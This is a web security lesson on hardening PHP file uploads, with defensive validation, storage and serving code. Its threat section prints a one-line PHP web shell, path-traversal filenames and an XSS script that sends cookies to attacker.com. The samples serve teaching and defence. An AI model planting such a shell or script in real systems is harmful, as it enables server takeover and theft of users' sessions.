# Lesson 08 - File Upload Security: Handling the Danger

**Duration**: 60 minutes

---

## Introduction: One of the Most Dangerous Features

File uploads are **extremely dangerous** if not properly secured. A single vulnerable upload form can allow attackers to:
- Upload and execute malicious code (PHP shells)
- Take complete control of the server
- Deface the website
- Steal data
- Use your server for attacks on others

**Real-world breaches**:
- **Many content management systems** have been compromised through file upload vulnerabilities
- **Web shells** uploaded through avatar/profile picture uploads
- **Malware distribution** through document uploads

Yet file uploads are essential for modern web apps: profile pictures, documents, attachments, etc.

**The challenge**: How do we allow legitimate uploads while blocking malicious ones?

---

## The Threat: What Can Go Wrong?

### 1. PHP File Upload (Remote Code Execution)

**Attack**:
```php
// Attacker uploads: shell.php
<?php
// Simple PHP shell
system($_GET['cmd']);
?>

// Visit: https://example.com/uploads/shell.php?cmd=ls
// Result: Attacker can execute any command on your server!
```

**Impact**: Complete server compromise. Attacker can:
- Read any file (including database credentials)
- Delete files
- Modify code
- Install backdoors
- Pivot to other systems

### 2. Path Traversal

**Attack**:
```php
// Attacker uploads file named: ../../../etc/passwd
// Or: ../../index.php

// If filename not sanitized, could overwrite critical files
```

### 3. MIME Type Spoofing

**Attack**:
```php
// Attacker creates shell.php
// Sets MIME type to: image/jpeg
// Some validators only check MIME type → Upload succeeds
```

### 4. Double Extension

**Attack**:
```
// Attacker uploads: image.php.jpg
// Some servers execute as PHP if configured incorrectly
// Or: shell.php.png where .png is interpreted as comment
```

### 5. XSS via File Upload

**Attack**:
```html
<!-- Attacker uploads HTML file -->
<html>
<body>
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
</body>
</html>

<!-- If served with HTML content-type, executes XSS -->
```

### 6. Denial of Service

**Attack**:
```
// Upload extremely large files → Fill disk space
// Upload thousands of files → Exhaust inodes
// Upload zip bombs → Decompression fills disk
```

### 7. Malware Distribution

**Attack**:
```
// Attacker uploads malware disguised as legitimate file
// Other users download it
// Your site becomes malware distribution point
```

---

## File Upload Security Layers

Defense in depth - implement ALL of these:

1. **Validation**: File type, size, name
2. **Storage**: Location, permissions, naming
3. **Access Control**: Who can upload/download
4. **Content Inspection**: Verify actual file content
5. **Serving**: How files are delivered to users

Let's implement each layer!

---

## Layer 1: File Type Validation

### Check File Extension (Basic)

```php
<?php
function validateFileExtension($filename): bool {
    // Allowed extensions
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];

    // Get extension (lowercase)
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    // Check if allowed
    return in_array($extension, $allowedExtensions, true);
}

// Usage
if (!validateFileExtension($_FILES['upload']['name'])) {
    die('File type not allowed');
}
```

**But this is NOT sufficient!** Attackers can rename `shell.php` to `shell.jpg`.

### Check MIME Type

```php
<?php
function validateMimeType($tmpPath): bool {
    // Allowed MIME types
    $allowedMimes = [
        'image/jpeg',
        'image/png',
        'image/gif',
        'application/pdf'
    ];

    // Get MIME type from PHP
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $tmpPath);
    finfo_close($finfo);

    return in_array($mimeType, $allowedMimes, true);
}

// Usage
if (!validateMimeType($_FILES['upload']['tmp_name'])) {
    die('Invalid file type');
}
```

**But this is still NOT sufficient!** MIME type can be spoofed.

### Check Magic Bytes (File Signature)

The most reliable method - check the actual file content:

```php
<?php
function validateFileSignature($tmpPath, $expectedType): bool {
    $handle = fopen($tmpPath, 'rb');
    $bytes = fread($handle, 12); // Read first 12 bytes
    fclose($handle);

    // Define file signatures (magic bytes)
    $signatures = [
        'jpg' => [
            "\xFF\xD8\xFF\xE0", // JFIF
            "\xFF\xD8\xFF\xE1", // Exif
            "\xFF\xD8\xFF\xE8"  // SPIFF
        ],
        'png' => [
            "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
        ],
        'gif' => [
            "GIF87a",
            "GIF89a"
        ],
        'pdf' => [
            "%PDF"
        ]
    ];

    if (!isset($signatures[$expectedType])) {
        return false;
    }

    // Check if file starts with any valid signature
    foreach ($signatures[$expectedType] as $signature) {
        if (strpos($bytes, $signature) === 0) {
            return true;
        }
    }

    return false;
}

// Usage
$extension = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));

if (!validateFileSignature($_FILES['upload']['tmp_name'], $extension)) {
    die('File signature does not match extension');
}
```

### Complete Validation Function

```php
<?php
function validateUploadedFile(array $file, string $type = 'image'): array {
    // Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return ['valid' => false, 'error' => 'Upload failed'];
    }

    // Define allowed types
    $types = [
        'image' => [
            'extensions' => ['jpg', 'jpeg', 'png', 'gif'],
            'mimes' => ['image/jpeg', 'image/png', 'image/gif'],
            'max_size' => 5 * 1024 * 1024 // 5MB
        ],
        'document' => [
            'extensions' => ['pdf', 'doc', 'docx'],
            'mimes' => ['application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
            'max_size' => 10 * 1024 * 1024 // 10MB
        ]
    ];

    if (!isset($types[$type])) {
        return ['valid' => false, 'error' => 'Invalid type specified'];
    }

    $config = $types[$type];

    // Check file size
    if ($file['size'] > $config['max_size']) {
        return ['valid' => false, 'error' => 'File too large'];
    }

    if ($file['size'] === 0) {
        return ['valid' => false, 'error' => 'File is empty'];
    }

    // Check extension
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, $config['extensions'], true)) {
        return ['valid' => false, 'error' => 'File extension not allowed'];
    }

    // Check MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);

    if (!in_array($mimeType, $config['mimes'], true)) {
        return ['valid' => false, 'error' => 'File MIME type not allowed'];
    }

    // Check magic bytes (for images)
    if ($type === 'image') {
        if (!validateFileSignature($file['tmp_name'], $extension)) {
            return ['valid' => false, 'error' => 'File signature invalid'];
        }
    }

    return ['valid' => true, 'extension' => $extension];
}
```

---

## Layer 2: Filename Sanitization

**Never use the original filename directly!**

```php
<?php
function generateSafeFilename(string $originalName): string {
    // Get extension
    $extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

    // Validate extension
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    if (!in_array($extension, $allowedExtensions, true)) {
        throw new Exception('Invalid file extension');
    }

    // Generate unique name
    $uniqueName = bin2hex(random_bytes(16));

    // Return: [random_32_chars].[extension]
    return $uniqueName . '.' . $extension;
}

// Usage
$safeName = generateSafeFilename($_FILES['upload']['name']);
// Result: a1b2c3d4e5f6...xyz.jpg
```

### Alternative: Preserve Original Name (If Needed)

```php
<?php
function sanitizeFilename(string $filename): string {
    // Get parts
    $name = pathinfo($filename, PATHINFO_FILENAME);
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    // Remove dangerous characters
    $name = preg_replace('/[^a-zA-Z0-9_-]/', '_', $name);

    // Limit length
    $name = substr($name, 0, 100);

    // Add timestamp for uniqueness
    $name = $name . '_' . time();

    return $name . '.' . $extension;
}

// Usage
$safeName = sanitizeFilename($_FILES['upload']['name']);
// Result: my_document_1699564800.pdf
```

---

## Layer 3: Secure File Storage

### Rule 1: Store Outside Web Root

```php
<?php
// BAD - Files accessible directly via URL
$uploadDir = __DIR__ . '/uploads/';
move_uploaded_file($tmpName, $uploadDir . $filename);
// Anyone can visit: https://example.com/uploads/file.php

// GOOD - Files NOT accessible directly
$uploadDir = '/var/www/private_uploads/';
move_uploaded_file($tmpName, $uploadDir . $filename);
// Files must be served through PHP script with access control
```

### Project Structure

```
project/
├── public/                  ← Web root (public_html, htdocs, www)
│   ├── index.php
│   ├── css/
│   └── js/
├── uploads/                 ← OUTSIDE web root
│   ├── avatars/
│   ├── documents/
│   └── temp/
├── src/
└── config/
```

### Rule 2: Set Correct Permissions

```bash
# Upload directory: writable by web server, not executable
chmod 755 /var/www/uploads
chown www-data:www-data /var/www/uploads

# Individual files: readable, NOT executable
chmod 644 /var/www/uploads/*
```

```php
<?php
// Set permissions in PHP
$uploadPath = $uploadDir . $filename;
move_uploaded_file($tmpName, $uploadPath);
chmod($uploadPath, 0644); // rw-r--r--
```

### Rule 3: Prevent Script Execution

Add `.htaccess` to uploads directory (Apache):

```apache
# /uploads/.htaccess

# Deny script execution
<FilesMatch "\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|htm|shtml|sh|cgi)$">
    Deny from all
</FilesMatch>

# Only allow specific file types
<FilesMatch "\.(jpg|jpeg|png|gif|pdf)$">
    Allow from all
</FilesMatch>
```

Or use Nginx config:

```nginx
location /uploads/ {
    # Deny execution of PHP files
    location ~ \.php$ {
        deny all;
    }
}
```

---

## Layer 4: Image-Specific Validation

For images, add additional checks:

### Verify Image Integrity

```php
<?php
function validateImage($tmpPath, $extension): bool {
    // Attempt to load image
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
            $image = @imagecreatefromjpeg($tmpPath);
            break;
        case 'png':
            $image = @imagecreatefrompng($tmpPath);
            break;
        case 'gif':
            $image = @imagecreatefromgif($tmpPath);
            break;
        default:
            return false;
    }

    if (!$image) {
        return false;
    }

    imagedestroy($image);
    return true;
}

// Usage
if (!validateImage($_FILES['upload']['tmp_name'], $extension)) {
    die('Invalid or corrupted image');
}
```

### Re-encode Images (Most Secure)

Strip potential malicious content by re-encoding:

```php
<?php
function sanitizeImage($tmpPath, $outputPath, $extension): bool {
    // Load original image
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
            $image = @imagecreatefromjpeg($tmpPath);
            break;
        case 'png':
            $image = @imagecreatefrompng($tmpPath);
            break;
        case 'gif':
            $image = @imagecreatefromgif($tmpPath);
            break;
        default:
            return false;
    }

    if (!$image) {
        return false;
    }

    // Re-save image (strips EXIF and other metadata)
    $result = false;
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
            $result = imagejpeg($image, $outputPath, 90);
            break;
        case 'png':
            $result = imagepng($image, $outputPath, 9);
            break;
        case 'gif':
            $result = imagegif($image, $outputPath);
            break;
    }

    imagedestroy($image);
    return $result;
}

// Usage
$safeName = generateSafeFilename($_FILES['upload']['name']);
$uploadPath = $uploadDir . $safeName;

if (!sanitizeImage($_FILES['upload']['tmp_name'], $uploadPath, $extension)) {
    die('Failed to process image');
}
```

### Resize Images

Also helps remove malicious content and saves space:

```php
<?php
function resizeImage($sourcePath, $destPath, $maxWidth, $maxHeight, $extension): bool {
    // Load image
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
            $source = imagecreatefromjpeg($sourcePath);
            break;
        case 'png':
            $source = imagecreatefrompng($sourcePath);
            break;
        case 'gif':
            $source = imagecreatefromgif($sourcePath);
            break;
        default:
            return false;
    }

    if (!$source) {
        return false;
    }

    // Get dimensions
    $width = imagesx($source);
    $height = imagesy($source);

    // Calculate new dimensions
    $ratio = min($maxWidth / $width, $maxHeight / $height);

    if ($ratio < 1) {
        $newWidth = (int)($width * $ratio);
        $newHeight = (int)($height * $ratio);
    } else {
        $newWidth = $width;
        $newHeight = $height;
    }

    // Create new image
    $dest = imagecreatetruecolor($newWidth, $newHeight);

    // Preserve transparency for PNG/GIF
    if ($extension === 'png' || $extension === 'gif') {
        imagealphablending($dest, false);
        imagesavealpha($dest, true);
        $transparent = imagecolorallocatealpha($dest, 255, 255, 255, 127);
        imagefilledrectangle($dest, 0, 0, $newWidth, $newHeight, $transparent);
    }

    // Resize
    imagecopyresampled($dest, $source, 0, 0, 0, 0, $newWidth, $newHeight, $width, $height);

    // Save
    $result = false;
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
            $result = imagejpeg($dest, $destPath, 90);
            break;
        case 'png':
            $result = imagepng($dest, $destPath, 9);
            break;
        case 'gif':
            $result = imagegif($dest, $destPath);
            break;
    }

    // Cleanup
    imagedestroy($source);
    imagedestroy($dest);

    return $result;
}
```

---

## Layer 5: Secure File Serving

Never serve uploaded files directly! Use a download script with access control:

```php
<?php
// download.php

session_start();
require_once 'auth.php';

// Check if user is logged in
if (!isLoggedIn()) {
    http_response_code(401);
    die('Unauthorized');
}

// Get requested file
$fileId = $_GET['id'] ?? null;

if (!$fileId || !ctype_digit($fileId)) {
    http_response_code(400);
    die('Invalid file ID');
}

// Get file info from database
$stmt = $pdo->prepare("SELECT * FROM files WHERE id = ?");
$stmt->execute([$fileId]);
$file = $stmt->fetch();

if (!$file) {
    http_response_code(404);
    die('File not found');
}

// Check if user has permission to access this file
if ($file['user_id'] !== $_SESSION['user_id']) {
    // Allow if file is public
    if (!$file['is_public']) {
        http_response_code(403);
        die('Access denied');
    }
}

// File path (outside web root)
$filePath = '/var/www/uploads/' . $file['filename'];

if (!file_exists($filePath)) {
    http_response_code(404);
    die('File not found on disk');
}

// Get MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $filePath);
finfo_close($finfo);

// Set headers
header('Content-Type: ' . $mimeType);
header('Content-Length: ' . filesize($filePath));
header('Content-Disposition: inline; filename="' . basename($file['original_name']) . '"');

// Security headers
header('X-Content-Type-Options: nosniff');
header('Content-Security-Policy: default-src \'none\'; style-src \'unsafe-inline\'');

// Serve file
readfile($filePath);
```

### Force Download Instead of Display

```php
// Change Content-Disposition to 'attachment'
header('Content-Disposition: attachment; filename="' . basename($file['original_name']) . '"');
```

---

## Complete Secure Upload Implementation

```php
<?php
// SecureFileUpload.php

class SecureFileUpload {

    private string $uploadDir;
    private array $allowedTypes;
    private int $maxSize;

    public function __construct(string $uploadDir, array $allowedTypes, int $maxSize) {
        $this->uploadDir = rtrim($uploadDir, '/') . '/';
        $this->allowedTypes = $allowedTypes;
        $this->maxSize = $maxSize;

        // Ensure upload directory exists
        if (!is_dir($this->uploadDir)) {
            mkdir($this->uploadDir, 0755, true);
        }
    }

    public function upload(array $file): array {
        // Step 1: Check for upload errors
        if ($file['error'] !== UPLOAD_ERR_OK) {
            return $this->error('Upload failed: ' . $this->getUploadError($file['error']));
        }

        // Step 2: Validate size
        if ($file['size'] > $this->maxSize) {
            return $this->error('File too large (max ' . $this->formatBytes($this->maxSize) . ')');
        }

        if ($file['size'] === 0) {
            return $this->error('File is empty');
        }

        // Step 3: Validate extension
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this->allowedTypes, true)) {
            return $this->error('File type not allowed');
        }

        // Step 4: Validate MIME type
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimeType = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);

        $allowedMimes = $this->getMimeTypes($extension);
        if (!in_array($mimeType, $allowedMimes, true)) {
            return $this->error('File MIME type not allowed');
        }

        // Step 5: Validate file signature
        if (!$this->validateSignature($file['tmp_name'], $extension)) {
            return $this->error('File signature invalid');
        }

        // Step 6: For images, validate and re-encode
        if (in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
            if (!$this->validateAndProcessImage($file['tmp_name'], $extension)) {
                return $this->error('Invalid or corrupted image');
            }
        }

        // Step 7: Generate safe filename
        $filename = $this->generateFilename($extension);
        $filepath = $this->uploadDir . $filename;

        // Step 8: Move file
        if (in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
            // Re-encode image (already processed)
            if (!$this->saveImage($file['tmp_name'], $filepath, $extension)) {
                return $this->error('Failed to save image');
            }
        } else {
            if (!move_uploaded_file($file['tmp_name'], $filepath)) {
                return $this->error('Failed to move uploaded file');
            }
        }

        // Step 9: Set permissions
        chmod($filepath, 0644);

        // Success!
        return [
            'success' => true,
            'filename' => $filename,
            'original_name' => $file['name'],
            'size' => filesize($filepath),
            'mime_type' => $mimeType
        ];
    }

    private function validateSignature(string $tmpPath, string $extension): bool {
        $handle = fopen($tmpPath, 'rb');
        $bytes = fread($handle, 12);
        fclose($handle);

        $signatures = [
            'jpg' => ["\xFF\xD8\xFF"],
            'jpeg' => ["\xFF\xD8\xFF"],
            'png' => ["\x89\x50\x4E\x47"],
            'gif' => ["GIF87a", "GIF89a"],
            'pdf' => ["%PDF"]
        ];

        if (!isset($signatures[$extension])) {
            return true; // No signature check for this type
        }

        foreach ($signatures[$extension] as $signature) {
            if (strpos($bytes, $signature) === 0) {
                return true;
            }
        }

        return false;
    }

    private function validateAndProcessImage(string $tmpPath, string $extension): bool {
        $image = null;

        switch ($extension) {
            case 'jpg':
            case 'jpeg':
                $image = @imagecreatefromjpeg($tmpPath);
                break;
            case 'png':
                $image = @imagecreatefrompng($tmpPath);
                break;
            case 'gif':
                $image = @imagecreatefromgif($tmpPath);
                break;
        }

        if (!$image) {
            return false;
        }

        imagedestroy($image);
        return true;
    }

    private function saveImage(string $tmpPath, string $destPath, string $extension): bool {
        $image = null;

        switch ($extension) {
            case 'jpg':
            case 'jpeg':
                $image = imagecreatefromjpeg($tmpPath);
                break;
            case 'png':
                $image = imagecreatefrompng($tmpPath);
                break;
            case 'gif':
                $image = imagecreatefromgif($tmpPath);
                break;
        }

        if (!$image) {
            return false;
        }

        $result = false;

        switch ($extension) {
            case 'jpg':
            case 'jpeg':
                $result = imagejpeg($image, $destPath, 90);
                break;
            case 'png':
                $result = imagepng($image, $destPath, 9);
                break;
            case 'gif':
                $result = imagegif($image, $destPath);
                break;
        }

        imagedestroy($image);
        return $result;
    }

    private function generateFilename(string $extension): string {
        return bin2hex(random_bytes(16)) . '.' . $extension;
    }

    private function getMimeTypes(string $extension): array {
        $mimes = [
            'jpg' => ['image/jpeg'],
            'jpeg' => ['image/jpeg'],
            'png' => ['image/png'],
            'gif' => ['image/gif'],
            'pdf' => ['application/pdf'],
            'doc' => ['application/msword'],
            'docx' => ['application/vnd.openxmlformats-officedocument.wordprocessingml.document']
        ];

        return $mimes[$extension] ?? [];
    }

    private function getUploadError(int $code): string {
        $errors = [
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file was uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'A PHP extension stopped the file upload'
        ];

        return $errors[$code] ?? 'Unknown error';
    }

    private function formatBytes(int $bytes): string {
        $units = ['B', 'KB', 'MB', 'GB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= (1 << (10 * $pow));

        return round($bytes, 2) . ' ' . $units[$pow];
    }

    private function error(string $message): array {
        return [
            'success' => false,
            'error' => $message
        ];
    }
}
```

### Usage

```php
<?php
require_once 'SecureFileUpload.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {

    $uploader = new SecureFileUpload(
        uploadDir: '/var/www/uploads/',
        allowedTypes: ['jpg', 'jpeg', 'png', 'gif'],
        maxSize: 5 * 1024 * 1024 // 5MB
    );

    $result = $uploader->upload($_FILES['upload']);

    if ($result['success']) {
        // Store in database
        $stmt = $pdo->prepare("
            INSERT INTO files (user_id, filename, original_name, size, mime_type)
            VALUES (?, ?, ?, ?, ?)
        ");
        $stmt->execute([
            $_SESSION['user_id'],
            $result['filename'],
            $result['original_name'],
            $result['size'],
            $result['mime_type']
        ]);

        echo "Upload successful!";
    } else {
        echo "Error: " . $result['error'];
    }
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload" accept="image/*" required>
    <button type="submit">Upload</button>
</form>
```

---

## File Upload Security Checklist

- [ ] **Validate file extension** - Whitelist only
- [ ] **Validate MIME type** - Check with finfo
- [ ] **Validate file signature** - Magic bytes check
- [ ] **Validate file size** - Max size limit
- [ ] **For images**: Re-encode to strip metadata
- [ ] **Generate unique filenames** - Never use original name directly
- [ ] **Store outside web root** - Not publicly accessible
- [ ] **Prevent script execution** - .htaccess or Nginx config
- [ ] **Set correct permissions** - 644 for files, 755 for directories
- [ ] **Serve through PHP** - With access control
- [ ] **Rate limit uploads** - Prevent abuse
- [ ] **Virus scanning** - If handling user documents (ClamAV)

---

## Key Takeaways

1. **File uploads are extremely dangerous** - Implement all security layers
2. **Validate extension, MIME type, and signature** - Never trust just one
3. **Generate unique filenames** - Never use original names
4. **Store outside web root** - Prevent direct access
5. **Prevent script execution** - .htaccess or Nginx config
6. **Re-encode images** - Strip potential malicious content
7. **Serve through PHP** - With access control checks
8. **Set correct permissions** - Files not executable
9. **Limit file sizes** - Prevent DoS
10. **Test with malicious files** - Try to bypass your own security

---

## What's Next?

File uploads secured! Next: **Access Control & Authorization** - ensuring users can only access what they're allowed to.

You'll learn:
- Role-based access control (RBAC)
- Permission systems
- Horizontal vs vertical privilege escalation
- Securing admin functions
- Building flexible authorization systems
